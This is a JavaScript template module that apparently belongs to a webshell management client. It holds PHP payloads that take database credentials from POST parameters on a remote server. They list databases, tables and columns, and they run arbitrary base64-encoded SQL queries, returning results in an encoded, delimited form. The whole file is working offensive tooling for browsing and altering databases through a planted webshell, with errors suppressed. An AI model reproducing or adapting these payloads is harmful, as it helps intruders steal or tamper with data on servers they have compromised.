/**
 * 数据库管理模板::mysql
 * i 数据分隔符号 => \t|\t
 */

module.exports = (arg1, arg2, arg3, arg4, arg5, arg6) => ({
  // 显示所有数据库
  show_databases: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $port=explode(":",$hst)[1];
      $hst=explode(":",$hst)[0];
      $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
      $q=@mysqli_query($T,"SHOW DATABASES");
      while($rs=@mysqli_fetch_row($q)){
        echo(trim($rs[0]).chr(9));
      }
      @mysqli_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}'
  },
  // 显示数据库所有表
  show_tables: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $port=explode(":",$hst)[1];
      $hst=explode(":",$hst)[0];
      $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
      $q=@mysqli_query($T, "SHOW TABLES FROM \`{$dbn}\`");
      while($rs=@mysqli_fetch_row($q)){
        echo(trim($rs[0]).chr(9));
      }
      @mysqli_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}'
  },
  // 显示表字段
  show_columns: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $tab=$m?stripslashes($_POST["${arg5}"]):$_POST["${arg5}"];
      $port=explode(":",$hst)[1];
      $hst=explode(":",$hst)[0];
      $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
      @mysqli_select_db($T, $dbn);
      $q=@mysqli_query($T, "SHOW COLUMNS FROM \`{$tab}\`");
      while($rs=@mysqli_fetch_row($q)){
        echo(trim($rs[0])." (".$rs[1].")".chr(9));
      }
      @mysqli_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{table}'
  },
  // 执行SQL语句
  query: {
    _: `$m=get_magic_quotes_gpc();
      $hst=$m?stripslashes($_POST["${arg1}"]):$_POST["${arg1}"];
      $usr=$m?stripslashes($_POST["${arg2}"]):$_POST["${arg2}"];
      $pwd=$m?stripslashes($_POST["${arg3}"]):$_POST["${arg3}"];
      $dbn=$m?stripslashes($_POST["${arg4}"]):$_POST["${arg4}"];
      $sql=base64_decode($_POST["${arg5}"]);
      $port=explode(":",$hst)[1];
      $hst=explode(":",$hst)[0];
      $T=@mysqli_connect($hst,$usr,$pwd,"",$port);
      @mysqli_query($T,"SET NAMES $_POST[${arg6}]");
      @mysqli_select_db($T,$dbn);
      $q=@mysqli_query($T,$sql);
      if(is_bool($q)){
        echo("Status\t|\t\r\n".($q?"VHJ1ZQ==":"RmFsc2U=")."\t|\t\r\n");
      }else{
        $i=0;
        while($col=@mysqli_fetch_field($q)){echo($col->name."\t|\t");
        $i++;
      }
      echo("\r\n");
      while($rs=@mysqli_fetch_row($q)){
        for($c=0;$c<$i;$c++){
          echo(base64_encode(trim($rs[$c])));
          echo("\t|\t");
        }
        echo("\r\n");
      }
    }
    @mysqli_close($T);`.replace(/\n\s+/g, ''),
    [arg1]: '#{host}',
    [arg2]: '#{user}',
    [arg3]: '#{passwd}',
    [arg4]: '#{db}',
    [arg5]: '#{base64::sql}',
    [arg6]: '#{encode}'
  }
})